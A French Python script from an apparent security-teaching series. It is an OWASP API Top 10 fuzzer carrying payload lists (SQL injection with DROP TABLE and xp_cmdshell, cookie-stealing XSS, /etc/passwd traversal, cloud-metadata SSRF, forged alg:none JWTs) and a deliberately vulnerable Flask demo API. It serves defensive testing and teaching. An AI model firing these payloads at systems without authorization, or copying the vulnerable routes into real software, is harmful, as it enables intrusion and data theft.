#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  🛡️  BOUCLIER NUMÉRIQUE — JOUR 21 : FUZZER D'API AUTOMATIQUE  ║
║  Objectif  : Détecter les vulnérabilités OWASP API Top 10      ║
║  Technique : Fuzzing ciblé · Payloads adaptatifs · Rapport HTML ║
║  Légalité  : Usage sur vos propres APIs UNIQUEMENT             ║
╚══════════════════════════════════════════════════════════════════╝

Problème concret : Une API REST non testée expose souvent des dizaines
de vulnérabilités silencieuses : paramètres non validés, injection SQL
dans les query strings, IDOR (accès aux ressources d'autres utilisateurs),
tokens JWT mal vérifiés, rate limiting absent, données sensibles dans
les réponses d'erreur...

Ce fuzzer automatise la détection des vulnérabilités OWASP API Top 10 :
  API1  — Broken Object Level Authorization (IDOR)
  API2  — Broken Authentication (JWT, tokens)
  API3  — Broken Object Property Level Auth (mass assignment)
  API4  — Unrestricted Resource Consumption (rate limiting)
  API5  — Broken Function Level Authorization (méthodes HTTP)
  API6  — Unrestricted Access to Sensitive Business Flows
  API7  — Server Side Request Forgery (SSRF)
  API8  — Security Misconfiguration (headers, CORS, erreurs)
  API9  — Improper Inventory Management (versions, endpoints cachés)
  API10 — Unsafe Consumption of APIs (injections)

Conformité : OWASP API Security Top 10 2023 · ISO 27001 A.14.2.8
"""

import json
import time
import urllib.request
import urllib.error
import urllib.parse
import threading
import sqlite3
import html
import re
import random
import string
from pathlib import Path
from datetime import datetime
from typing import Optional
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed


# ════════════════════════════════════════════════════════════════
# BIBLIOTHÈQUE DE PAYLOADS — OWASP API Top 10
# ════════════════════════════════════════════════════════════════

PAYLOADS = {

    # ── API10 : Injections ──────────────────────────────────────
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1; DROP TABLE users--",
        "' UNION SELECT null,username,password FROM users--",
        "1' AND SLEEP(3)--",
        "\" OR \"\"=\"",
        "' OR 1=1#",
        "admin'--",
        "1 OR 1=1",
        "'; EXEC xp_cmdshell('whoami')--",
    ],

    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "'\"><script>alert(document.cookie)</script>",
        "<iframe src=javascript:alert(1)>",
        "{{7*7}}",          # Template injection
        "${7*7}",           # EL injection
        "#{7*7}",           # EL injection
    ],

    "path_traversal": [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ],

    "ssrf": [
        "http://localhost/admin",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",   # AWS metadata
        "http://metadata.google.internal/",            # GCP metadata
        "http://100.100.100.200/latest/meta-data/",   # Alibaba metadata
        "http://0.0.0.0:8080",
        "file:///etc/passwd",
        "dict://localhost:11211/stats",                # Memcached
        "ftp://localhost:21",
    ],

    # ── API1 : IDOR — IDs à tester autour de la valeur cible ───
    "idor_ids": [
        "0", "1", "2", "100", "999", "-1",
        "null", "undefined", "admin", "me",
        "00000000-0000-0000-0000-000000000001",  # UUID version
    ],

    # ── API8 : Mauvaise configuration ───────────────────────────
    "sensitive_endpoints": [
        "/api/v1/admin", "/api/v2/admin", "/api/admin",
        "/api/v1/users", "/api/v1/users/all",
        "/api/v1/config", "/api/v1/settings",
        "/api/v1/debug", "/api/v1/health",
        "/api/v1/metrics", "/api/v1/status",
        "/api/v1/swagger", "/api-docs", "/swagger.json",
        "/openapi.json", "/api/v1/docs",
        "/.env", "/config.json", "/secrets",
        "/api/v1/export", "/api/v1/dump",
        "/api/v2/users", "/api/v3/users",      # API9 : inventory
        "/v1/users", "/v2/users",
    ],

    # ── API2 : JWT malformés ─────────────────────────────────────
    "jwt_attacks": [
        # alg:none attack
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
        # JWT avec secret vide
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.2kuHJmVFNX53D39KQ3GtBJGmSBNuJ_qdGBHBbUJTxno",
        "Bearer null",
        "Bearer undefined",
        "Bearer admin",
        "",  # Pas de token
    ],

    # ── Données sensibles dans les réponses ─────────────────────
    "sensitive_patterns": [
        r"password",
        r"passwd",
        r"secret",
        r"api[_-]?key",
        r"private[_-]?key",
        r"access[_-]?token",
        r"credit[_-]?card",
        r"\b\d{16}\b",           # Numéro de CB
        r"[A-Za-z0-9+/]{40,}=*", # Clé base64
        r"AKIA[0-9A-Z]{16}",     # AWS Access Key
        r"-----BEGIN .* KEY-----",
    ],
}

# Codes HTTP indicatifs de vulnérabilités
SUSPICIOUS_CODES = {
    200: "Requête suspecte acceptée — possible vulnérabilité",
    500: "Erreur serveur — possible stack trace/info disclosure",
    503: "Service indisponible — possible DoS",
}

SAFE_CODES = {400, 401, 403, 404, 422, 429}


# ════════════════════════════════════════════════════════════════
# MOTEUR DE FUZZING
# ════════════════════════════════════════════════════════════════

class ApiFuzzer:

    def __init__(self, base_url: str, token: Optional[str] = None,
                 timeout: float = 5.0, rate_limit: float = 0.1,
                 max_workers: int = 5):
        self.base_url   = base_url.rstrip("/")
        self.token      = token
        self.timeout    = timeout
        self.rate_limit = rate_limit   # secondes entre requêtes
        self.max_workers = max_workers
        self.findings   = []
        self._lock      = threading.Lock()
        self._req_count = 0

    def _request(self, method: str, path: str,
                 params: dict = None, headers: dict = None,
                 body: dict = None) -> dict:
        """Effectue une requête HTTP et retourne le résultat normalisé."""
        url = self.base_url + path
        if params:
            url += "?" + urllib.parse.urlencode(params)

        req_headers = {
            "User-Agent": "BouclierNumerique-SecurityScanner/1.0",
            "Accept": "application/json",
        }
        if self.token:
            req_headers["Authorization"] = f"Bearer {self.token}"
        if headers:
            req_headers.update(headers)

        data = json.dumps(body).encode() if body else None
        if data:
            req_headers["Content-Type"] = "application/json"

        try:
            req = urllib.request.Request(
                url, data=data, headers=req_headers, method=method
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body_text = resp.read(4096).decode("utf-8", errors="replace")
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": body_text,
                    "url": url,
                    "method": method,
                    "error": None,
                    "latency_ms": 0,
                }
        except urllib.error.HTTPError as e:
            body_text = e.read(2048).decode("utf-8", errors="replace")
            return {
                "status": e.code,
                "headers": dict(e.headers) if e.headers else {},
                "body": body_text,
                "url": url,
                "method": method,
                "error": str(e),
                "latency_ms": 0,
            }
        except Exception as e:
            return {
                "status": 0,
                "headers": {},
                "body": "",
                "url": url,
                "method": method,
                "error": str(e),
                "latency_ms": 0,
            }
        finally:
            time.sleep(self.rate_limit)
            with self._lock:
                self._req_count += 1

    def _add_finding(self, category: str, severity: str, title: str,
                     description: str, evidence: str, url: str,
                     owasp: str, remediation: str):
        """Enregistre une vulnérabilité détectée."""
        finding = {
            "id": len(self.findings) + 1,
            "category": category,
            "severity": severity,
            "title": title,
            "description": description,
            "evidence": evidence[:500],
            "url": url,
            "owasp": owasp,
            "remediation": remediation,
            "ts": datetime.now().isoformat(),
        }
        with self._lock:
            self.findings.append(finding)

    # ── Test API1/API3 : IDOR & Mass Assignment ─────────────────

    def test_idor(self, endpoint: str, current_id: str = "1"):
        """Teste l'accès non autorisé à des ressources par manipulation d'ID."""
        print(f"  [IDOR] {endpoint}")
        results = []

        for alt_id in PAYLOADS["idor_ids"]:
            if alt_id == current_id:
                continue
            path = endpoint.replace("{id}", alt_id).replace(":id", alt_id)
            if "{" not in endpoint:
                path = f"{endpoint}/{alt_id}"

            r = self._request("GET", path)
            if r["status"] == 200:
                results.append((alt_id, r))

        # Si on peut accéder à plusieurs IDs différents sans authentification différente
        if len(results) > 1:
            self._add_finding(
                category="API1 — IDOR",
                severity="CRITIQUE",
                title=f"Accès non autorisé à des ressources tierces sur {endpoint}",
                description=(
                    f"L'endpoint {endpoint} retourne HTTP 200 pour "
                    f"{len(results)} IDs différents ({', '.join(r[0] for r in results[:5])}) "
                    "sans vérification d'appartenance. Un utilisateur peut accéder "
                    "aux données de n'importe quel autre utilisateur."
                ),
                evidence=f"IDs accessibles : {[r[0] for r in results[:10]]}",
                url=self.base_url + endpoint,
                owasp="API1:2023 — Broken Object Level Authorization",
                remediation=(
                    "Vérifier que l'ID demandé appartient à l'utilisateur authentifié. "
                    "Ne jamais faire confiance aux IDs fournis par le client."
                ),
            )

    # ── Test API2 : Authentification cassée (JWT) ───────────────

    def test_auth(self, protected_endpoint: str):
        """Teste les contournements d'authentification."""
        print(f"  [AUTH] {protected_endpoint}")

        # Test sans token
        r = self._request("GET", protected_endpoint,
                          headers={"Authorization": ""})
        if r["status"] == 200:
            self._add_finding(
                category="API2 — Auth cassée",
                severity="CRITIQUE",
                title=f"Endpoint protégé accessible sans authentification",
                description=f"{protected_endpoint} retourne HTTP 200 sans token.",
                evidence=r["body"][:200],
                url=self.base_url + protected_endpoint,
                owasp="API2:2023 — Broken Authentication",
                remediation="Vérifier la présence et la validité du token sur tous les endpoints protégés.",
            )

        # Test attaque alg:none JWT
        for malformed_jwt in PAYLOADS["jwt_attacks"][:3]:
            r = self._request("GET", protected_endpoint,
                              headers={"Authorization": f"Bearer {malformed_jwt}"})
            if r["status"] == 200:
                self._add_finding(
                    category="API2 — Auth cassée",
                    severity="CRITIQUE",
                    title="Authentification JWT contournée (alg:none ou token invalide accepté)",
                    description=(
                        f"Le serveur accepte un JWT malformé sur {protected_endpoint}. "
                        "Attaque alg:none possible — le serveur ne vérifie pas la signature."
                    ),
                    evidence=f"Token utilisé : {malformed_jwt[:50]}...",
                    url=self.base_url + protected_endpoint,
                    owasp="API2:2023 — Broken Authentication",
                    remediation=(
                        "Refuser explicitement l'algorithme 'none'. "
                        "Utiliser une bibliothèque JWT à jour avec vérification stricte."
                    ),
                )
                break

    # ── Test API4 : Rate Limiting ────────────────────────────────

    def test_rate_limiting(self, endpoint: str, n: int = 30):
        """Vérifie l'absence de rate limiting sur un endpoint sensible."""
        print(f"  [RATE] {endpoint} ({n} requêtes rapides)")
        success = 0
        saved_rate = self.rate_limit
        self.rate_limit = 0  # Requêtes rapides pour le test

        for _ in range(n):
            r = self._request("POST", endpoint,
                              body={"username": "test", "password": "test"})
            if r["status"] not in {429, 503}:
                success += 1
            else:
                break  # Rate limit détecté

        self.rate_limit = saved_rate

        if success >= n * 0.9:  # 90%+ passent sans limitation
            self._add_finding(
                category="API4 — Rate Limiting absent",
                severity="ÉLEVÉE",
                title=f"Absence de rate limiting sur {endpoint}",
                description=(
                    f"{success}/{n} requêtes successives acceptées sans limitation. "
                    "Un attaquant peut bruteforcer des mots de passe, spammer des emails, "
                    "ou épuiser les ressources sans obstacle."
                ),
                evidence=f"{success} requêtes en {n} tentatives sans HTTP 429",
                url=self.base_url + endpoint,
                owasp="API4:2023 — Unrestricted Resource Consumption",
                remediation=(
                    "Implémenter un rate limiter (ex: 5 tentatives/min par IP sur /login). "
                    "Retourner HTTP 429 avec Retry-After. Voir Jour 6 du Bouclier Numérique."
                ),
            )

    # ── Test API5 : Méthodes HTTP non restreintes ───────────────

    def test_http_methods(self, endpoint: str):
        """Vérifie si des méthodes HTTP dangereuses sont acceptées."""
        print(f"  [METH] {endpoint}")
        dangerous = ["PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]

        for method in dangerous:
            r = self._request(method, endpoint,
                              body={"test": "fuzzing"} if method in ("PUT", "PATCH") else None)
            if r["status"] not in {405, 501, 403, 404, 0}:
                severity = "CRITIQUE" if method in ("DELETE", "PUT") else "MODÉRÉE"
                self._add_finding(
                    category="API5 — Function Level Auth",
                    severity=severity,
                    title=f"Méthode {method} acceptée sur {endpoint}",
                    description=(
                        f"L'endpoint {endpoint} répond HTTP {r['status']} "
                        f"à la méthode {method}. Un attaquant peut potentiellement "
                        "modifier ou supprimer des ressources."
                    ),
                    evidence=f"HTTP {r['status']} sur {method} {endpoint}",
                    url=self.base_url + endpoint,
                    owasp="API5:2023 — Broken Function Level Authorization",
                    remediation=(
                        f"Restreindre explicitement les méthodes autorisées. "
                        f"Retourner HTTP 405 pour toute méthode non prévue."
                    ),
                )

    # ── Test API8 : Mauvaise configuration & endpoints cachés ───

    def test_security_headers(self, endpoint: str = "/"):
        """Vérifie la présence des headers de sécurité obligatoires."""
        print(f"  [HDR]  Vérification headers de sécurité")
        r = self._request("GET", endpoint)
        headers = {k.lower(): v for k, v in r.get("headers", {}).items()}

        required = {
            "x-content-type-options": "nosniff",
            "x-frame-options": None,
            "strict-transport-security": None,
            "content-security-policy": None,
        }
        dangerous = {
            "server": "Révèle la technologie serveur",
            "x-powered-by": "Révèle le framework",
            "x-aspnet-version": "Révèle la version .NET",
        }

        missing = [h for h in required if h not in headers]
        exposed = [(h, headers[h]) for h in dangerous if h in headers]

        if missing:
            self._add_finding(
                category="API8 — Mauvaise configuration",
                severity="MODÉRÉE",
                title="Headers de sécurité manquants",
                description=f"Headers absents : {', '.join(missing)}",
                evidence=f"Présents : {list(headers.keys())[:10]}",
                url=self.base_url + endpoint,
                owasp="API8:2023 — Security Misconfiguration",
                remediation=(
                    "Ajouter X-Content-Type-Options: nosniff, "
                    "Strict-Transport-Security, X-Frame-Options: DENY, "
                    "Content-Security-Policy."
                ),
            )
        if exposed:
            self._add_finding(
                category="API8 — Info disclosure",
                severity="FAIBLE",
                title="Headers révélant la technologie serveur",
                description=f"Headers exposés : {exposed}",
                evidence=str(exposed),
                url=self.base_url + endpoint,
                owasp="API8:2023 — Security Misconfiguration",
                remediation="Supprimer ou masquer les headers Server, X-Powered-By.",
            )

    def test_hidden_endpoints(self):
        """Découverte d'endpoints non documentés (API9)."""
        print(f"  [DISC] Découverte d'endpoints cachés ({len(PAYLOADS['sensitive_endpoints'])} cibles)")
        found = []

        for path in PAYLOADS["sensitive_endpoints"]:
            r = self._request("GET", path)
            if r["status"] not in {404, 0} and r["status"] < 500:
                found.append((path, r["status"]))

        if found:
            self._add_finding(
                category="API9 — Inventory management",
                severity="ÉLEVÉE",
                title=f"{len(found)} endpoints non documentés découverts",
                description=(
                    "Des endpoints sensibles sont accessibles mais non listés "
                    "dans la documentation officielle. Cela peut exposer des interfaces "
                    "d'administration, des versions obsolètes, ou des fichiers sensibles."
                ),
                evidence="\n".join(f"  {code} {path}" for path, code in found[:15]),
                url=self.base_url,
                owasp="API9:2023 — Improper Inventory Management",
                remediation=(
                    "Maintenir un inventaire exhaustif des endpoints. "
                    "Désactiver ou protéger les endpoints de debug, admin, et versions obsolètes."
                ),
            )

    # ── Test API10 : Injections ──────────────────────────────────

    def test_injections(self, endpoint: str, param: str = "id"):
        """Teste les injections SQL, XSS, Path Traversal sur un endpoint."""
        print(f"  [INJ]  {endpoint} (param: {param})")

        for category, payloads in [
            ("SQLi", PAYLOADS["sqli"]),
            ("XSS", PAYLOADS["xss"]),
            ("Path Traversal", PAYLOADS["path_traversal"]),
        ]:
            for payload in payloads[:4]:  # Limiter à 4 payloads par catégorie
                r = self._request("GET", endpoint, params={param: payload})

                # Détecter si le payload est réfléchi dans la réponse (XSS réfléchi)
                if category == "XSS" and payload in r.get("body", ""):
                    self._add_finding(
                        category=f"API10 — {category}",
                        severity="ÉLEVÉE",
                        title=f"XSS réfléchi potentiel sur {endpoint}",
                        description=f"Le payload XSS est retourné tel quel dans la réponse.",
                        evidence=f"Payload: {payload}\nRetrouvé dans: {r['body'][:200]}",
                        url=self.base_url + endpoint,
                        owasp="API10:2023 — Unsafe Consumption of APIs",
                        remediation="Encoder toutes les sorties. Utiliser Content-Security-Policy.",
                    )
                    break

                # Détecter les erreurs SQL dans la réponse
                if category == "SQLi" and r["status"] == 500:
                    sql_errors = ["SQL", "syntax", "mysql", "postgresql",
                                  "ORA-", "sqlite", "SQLSTATE"]
                    if any(err.lower() in r.get("body", "").lower() for err in sql_errors):
                        self._add_finding(
                            category="API10 — SQLi",
                            severity="CRITIQUE",
                            title=f"Injection SQL probable sur {endpoint}",
                            description=(
                                f"Le payload SQL provoque une erreur 500 avec "
                                "un message révélant la structure de la base de données."
                            ),
                            evidence=f"Payload: {payload}\nErreur: {r['body'][:300]}",
                            url=self.base_url + endpoint,
                            owasp="API10:2023 — Unsafe Consumption of APIs",
                            remediation=(
                                "Utiliser des requêtes paramétrées (prepared statements). "
                                "Ne jamais concaténer des entrées utilisateur dans une requête SQL."
                            ),
                        )
                        break

    # ── Test SSRF ────────────────────────────────────────────────

    def test_ssrf(self, endpoint: str, param: str = "url"):
        """Teste Server-Side Request Forgery sur les paramètres d'URL."""
        print(f"  [SSRF] {endpoint} (param: {param})")

        for payload in PAYLOADS["ssrf"][:5]:
            r = self._request("GET", endpoint, params={param: payload})
            if r["status"] == 200 and r.get("body"):
                # Vérifier si la réponse contient des données du serveur interne
                internal_data = ["root:", "localhost", "169.254", "metadata"]
                if any(d in r.get("body", "") for d in internal_data):
                    self._add_finding(
                        category="API7 — SSRF",
                        severity="CRITIQUE",
                        title=f"Server-Side Request Forgery sur {endpoint}",
                        description=(
                            "Le serveur fait des requêtes vers des URLs arbitraires fourni "
                            "par l'utilisateur. Un attaquant peut accéder aux métadonnées "
                            "cloud, aux services internes, ou scanner le réseau interne."
                        ),
                        evidence=f"Payload: {payload}\nRéponse: {r['body'][:300]}",
                        url=self.base_url + endpoint,
                        owasp="API7:2023 — Server Side Request Forgery",
                        remediation=(
                            "Valider et filtrer toutes les URLs fournies par les utilisateurs. "
                            "Utiliser une liste blanche de domaines autorisés. "
                            "Bloquer les IPs privées et metadata endpoints."
                        ),
                    )
                    break

    # ── Rapport ──────────────────────────────────────────────────

    def generate_report(self, output_path: Optional[Path] = None) -> str:
        """Génère un rapport HTML complet des vulnérabilités trouvées."""
        severity_order  = {"CRITIQUE": 0, "ÉLEVÉE": 1, "MODÉRÉE": 2, "FAIBLE": 3}
        severity_colors = {
            "CRITIQUE": "#e74c3c", "ÉLEVÉE": "#e67e22",
            "MODÉRÉE": "#f39c12", "FAIBLE": "#27ae60",
        }
        severity_icons = {
            "CRITIQUE": "🔴", "ÉLEVÉE": "🟠", "MODÉRÉE": "🟡", "FAIBLE": "🟢",
        }

        sorted_findings = sorted(
            self.findings,
            key=lambda x: severity_order.get(x["severity"], 9)
        )

        counts = defaultdict(int)
        for f in self.findings:
            counts[f["severity"]] += 1

        score = max(0, 100 - (
            counts.get("CRITIQUE", 0) * 25 +
            counts.get("ÉLEVÉE",   0) * 15 +
            counts.get("MODÉRÉE",  0) *  5 +
            counts.get("FAIBLE",   0) *  2
        ))
        score_color = "#e74c3c" if score < 50 else "#e67e22" if score < 75 else "#27ae60"

        findings_html = ""
        for f in sorted_findings:
            color = severity_colors.get(f["severity"], "#666")
            icon  = severity_icons.get(f["severity"], "⚪")
            findings_html += f"""
            <div class="finding" style="border-left: 4px solid {color};">
              <div class="finding-header">
                <span class="severity-badge" style="background:{color}">{icon} {html.escape(f['severity'])}</span>
                <span class="owasp-tag">{html.escape(f['owasp'].split('—')[0].strip())}</span>
                <strong>{html.escape(f['title'])}</strong>
              </div>
              <p>{html.escape(f['description'])}</p>
              <details>
                <summary>📋 Preuve technique</summary>
                <pre><code>{html.escape(f['evidence'])}</code></pre>
              </details>
              <div class="remediation">
                <strong>✅ Remédiation :</strong> {html.escape(f['remediation'])}
              </div>
              <div class="meta">
                🔗 {html.escape(f['url'])} &nbsp;|&nbsp; ⏱ {f['ts'][:19]}
              </div>
            </div>"""

        now = datetime.now().strftime("%d/%m/%Y %H:%M")
        report = f"""<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>🛡️ Rapport Pentest API — {html.escape(self.base_url)}</title>
  <style>
    :root {{
      --bg: #0f1117; --card: #1a1d27; --border: #2d3148;
      --text: #e2e8f0; --muted: #8892b0; --accent: #64ffda;
    }}
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; padding: 2rem; }}
    h1 {{ color: var(--accent); font-size: 1.8rem; margin-bottom: 0.3rem; }}
    .meta-info {{ color: var(--muted); font-size: 0.85rem; margin-bottom: 2rem; }}
    .score-card {{ background: var(--card); border: 1px solid var(--border); border-radius: 12px;
                   padding: 2rem; margin-bottom: 2rem; display: flex; align-items: center; gap: 2rem; }}
    .score-number {{ font-size: 4rem; font-weight: 900; color: {score_color}; }}
    .score-label {{ color: var(--muted); font-size: 0.9rem; }}
    .stats {{ display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2rem; }}
    .stat-chip {{ padding: 0.5rem 1rem; border-radius: 20px; font-weight: 700; font-size: 0.9rem; }}
    .finding {{ background: var(--card); border-radius: 8px; padding: 1.2rem; margin-bottom: 1rem;
                border: 1px solid var(--border); }}
    .finding-header {{ display: flex; align-items: center; gap: 0.7rem; margin-bottom: 0.8rem; flex-wrap: wrap; }}
    .severity-badge {{ color: white; padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.8rem; font-weight: 700; }}
    .owasp-tag {{ background: #1e3a5f; color: #7eb8f7; padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.8rem; }}
    p {{ color: var(--muted); margin: 0.5rem 0; font-size: 0.92rem; line-height: 1.5; }}
    details {{ margin: 0.8rem 0; }}
    summary {{ cursor: pointer; color: var(--accent); font-size: 0.85rem; }}
    pre {{ background: #0a0c14; padding: 1rem; border-radius: 6px; overflow-x: auto;
           font-size: 0.8rem; margin-top: 0.5rem; color: #a8b2d8; }}
    .remediation {{ background: rgba(100, 255, 218, 0.06); border-radius: 6px; padding: 0.8rem;
                    margin-top: 0.8rem; font-size: 0.88rem; }}
    .meta {{ color: var(--muted); font-size: 0.78rem; margin-top: 0.5rem; }}
    .section-title {{ color: var(--accent); font-size: 1.1rem; margin: 2rem 0 1rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }}
    .legal-banner {{ background: #2d1b00; border: 1px solid #7a4500; border-radius: 8px; padding: 1rem; margin-bottom: 2rem; font-size: 0.85rem; }}
  </style>
</head>
<body>
  <h1>🛡️ Rapport de Sécurité API</h1>
  <div class="meta-info">Cible : {html.escape(self.base_url)} &nbsp;·&nbsp; Généré le {now} &nbsp;·&nbsp; {self._req_count} requêtes effectuées</div>

  <div class="legal-banner">
    ⚖️ <strong>Ce rapport est confidentiel.</strong> Il contient des vulnérabilités de sécurité détectées lors d'un test autorisé.
    Ne pas partager sans accord du responsable de traitement. Conserver conformément à votre politique de gestion des incidents (RGPD Art. 32).
  </div>

  <div class="score-card">
    <div>
      <div class="score-number">{score}</div>
      <div class="score-label">Score de sécurité /100</div>
    </div>
    <div>
      <div class="stats">
        <span class="stat-chip" style="background:#e74c3c22;color:#e74c3c">🔴 {counts.get('CRITIQUE',0)} Critique(s)</span>
        <span class="stat-chip" style="background:#e67e2222;color:#e67e22">🟠 {counts.get('ÉLEVÉE',0)} Élevée(s)</span>
        <span class="stat-chip" style="background:#f39c1222;color:#f39c12">🟡 {counts.get('MODÉRÉE',0)} Modérée(s)</span>
        <span class="stat-chip" style="background:#27ae6022;color:#27ae60">🟢 {counts.get('FAIBLE',0)} Faible(s)</span>
      </div>
      <div style="color:var(--muted);font-size:0.85rem;margin-top:0.5rem">
        {len(self.findings)} vulnérabilité(s) détectée(s) sur {len(PAYLOADS['sensitive_endpoints'])} endpoints testés
      </div>
    </div>
  </div>

  <div class="section-title">📋 Vulnérabilités détectées</div>
  {findings_html if findings_html else '<p style="color:#27ae60;font-size:1rem;padding:1rem">✅ Aucune vulnérabilité détectée lors de ce scan.</p>'}

  <div class="section-title">📖 Référentiel OWASP API Security Top 10 (2023)</div>
  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:0.8rem;margin-bottom:2rem">
    {''.join(f'<div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;font-size:0.82rem"><strong style="color:var(--accent)">{item}</strong></div>' for item in [
      "API1 — Broken Object Level Auth",
      "API2 — Broken Authentication",
      "API3 — Broken Object Property Auth",
      "API4 — Unrestricted Resource Consumption",
      "API5 — Broken Function Level Auth",
      "API6 — Unrestricted Business Flows",
      "API7 — Server Side Request Forgery",
      "API8 — Security Misconfiguration",
      "API9 — Improper Inventory Management",
      "API10 — Unsafe Consumption of APIs",
    ])}
  </div>

  <div style="color:var(--muted);font-size:0.78rem;text-align:center;margin-top:2rem">
    Généré par <strong>Le Bouclier Numérique — Jour 21</strong> · OWASP API Security Top 10 2023 · Usage légal uniquement
  </div>
</body>
</html>"""

        if output_path:
            output_path.write_text(report, encoding="utf-8")
            print(f"\n  📄  Rapport HTML → {output_path}")

        return report


# ════════════════════════════════════════════════════════════════
# API DE DÉMONSTRATION LOCALE (Flask)
# ════════════════════════════════════════════════════════════════

def create_vulnerable_demo_api():
    """
    Crée une mini-API volontairement vulnérable pour la démonstration.
    Tourne sur localhost:7171 pendant la démo.
    """
    try:
        from flask import Flask, request, jsonify
        app = Flask(__name__)

        # Base de données en mémoire
        USERS = {
            "1": {"id": "1", "name": "Alice Martin", "email": "alice@corp.fr", "role": "user", "salary": 45000},
            "2": {"id": "2", "name": "Bob Dupont",   "email": "bob@corp.fr",   "role": "user", "salary": 52000},
            "3": {"id": "3", "name": "Admin",        "email": "admin@corp.fr", "role": "admin", "salary": 85000},
        }

        # API1 — IDOR : aucune vérification d'appartenance
        @app.route("/api/v1/users/<user_id>")
        def get_user(user_id):
            user = USERS.get(user_id)
            if user:
                return jsonify(user)  # ⚠️ Retourne TOUT, y compris salary
            return jsonify({"error": "Not found"}), 404

        # API4 — Pas de rate limiting sur le login
        @app.route("/api/v1/login", methods=["POST"])
        def login():
            data = request.get_json() or {}
            u, p = data.get("username", ""), data.get("password", "")
            if u == "admin" and p == "admin123":
                return jsonify({"token": "fake-jwt-admin-token", "role": "admin"})
            return jsonify({"error": "Invalid credentials"}), 401  # Pas de limite

        # API10 — Injection SQL simulée
        @app.route("/api/v1/search")
        def search():
            query = request.args.get("q", "")
            if "'" in query or ";" in query:
                return jsonify({
                    "error": "You have an error in your SQL syntax; "
                             "check the manual for your MySQL server version "
                             f"near '{query}' at line 1"
                }), 500  # ⚠️ Erreur SQL exposée
            return jsonify({"results": [], "query": query})

        # API8 — Pas de headers de sécurité (Flask par défaut)
        @app.route("/api/v1/health")
        def health():
            return jsonify({
                "status": "ok",
                "version": "1.0.0",
                "server": "Flask/3.0 Python/3.11",  # ⚠️ Info disclosure
                "debug": True,                         # ⚠️ Debug activé
            })

        # API9 — Endpoint admin non documenté
        @app.route("/api/v1/admin/users")
        def admin_users():
            return jsonify(list(USERS.values()))  # ⚠️ Pas d'auth !

        # API7 — SSRF via paramètre URL
        @app.route("/api/v1/fetch")
        def fetch_url():
            url = request.args.get("url", "")
            if "169.254.169.254" in url or "localhost" in url:
                return jsonify({
                    "content": "ami-12345678\ninstance-type=t2.micro",  # ⚠️ Simule AWS metadata
                    "source": url
                })
            return jsonify({"error": "URL not reachable"}), 400

        return app

    except ImportError:
        return None


# ════════════════════════════════════════════════════════════════
# MODE DÉMONSTRATION
# ════════════════════════════════════════════════════════════════

def run_demo():
    SEP = "=" * 62

    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║  🛡️  BOUCLIER NUMÉRIQUE — JOUR 21 : FUZZER D'API              ║
║  OWASP API Security Top 10 (2023) · Test sur API locale        ║
╚══════════════════════════════════════════════════════════════════╝

  ⚠️  RAPPEL LÉGAL : Ce fuzzer est conçu pour tester VOS propres
  APIs. Toute utilisation sur des systèmes tiers sans autorisation
  écrite est une infraction pénale (Art. L323-1 CP).
""")

    # Lancer l'API vulnérable en arrière-plan
    demo_app = create_vulnerable_demo_api()
    demo_port = 7171
    api_url = f"http://localhost:{demo_port}"

    if demo_app:
        import threading
        server_thread = threading.Thread(
            target=lambda: demo_app.run(port=demo_port, debug=False, use_reloader=False),
            daemon=True
        )
        server_thread.start()
        time.sleep(1.0)  # Laisser Flask démarrer
        print(f"  🚀  API de démonstration vulnérable démarrée sur {api_url}\n")
    else:
        print("  ⚠️  Flask non disponible — démonstration en mode simulé\n")
        api_url = "http://demo.bouclier-numerique.local"  # Simulation

    fuzzer = ApiFuzzer(
        base_url=api_url,
        timeout=3.0,
        rate_limit=0.05,
    )

    # ── Phase 1 : Reconnaissance ────────────────────────────────
    print(f"  {'─'*60}")
    print(f"  🔎  PHASE 1 : RECONNAISSANCE")
    print(f"  {'─'*60}\n")
    fuzzer.test_security_headers("/api/v1/health")
    fuzzer.test_hidden_endpoints()

    # ── Phase 2 : Authentification ──────────────────────────────
    print(f"\n  {'─'*60}")
    print(f"  🔐  PHASE 2 : AUTHENTIFICATION & AUTORISATION")
    print(f"  {'─'*60}\n")
    fuzzer.test_auth("/api/v1/admin/users")
    fuzzer.test_idor("/api/v1/users", current_id="1")
    fuzzer.test_rate_limiting("/api/v1/login", n=15)

    # ── Phase 3 : Injections ────────────────────────────────────
    print(f"\n  {'─'*60}")
    print(f"  💉  PHASE 3 : INJECTIONS")
    print(f"  {'─'*60}\n")
    fuzzer.test_injections("/api/v1/search", param="q")
    fuzzer.test_ssrf("/api/v1/fetch", param="url")
    fuzzer.test_http_methods("/api/v1/users/1")

    # ── Résultats ────────────────────────────────────────────────
    print(f"\n  {'─'*60}")
    print(f"  📊  RÉSULTATS")
    print(f"  {'─'*60}\n")

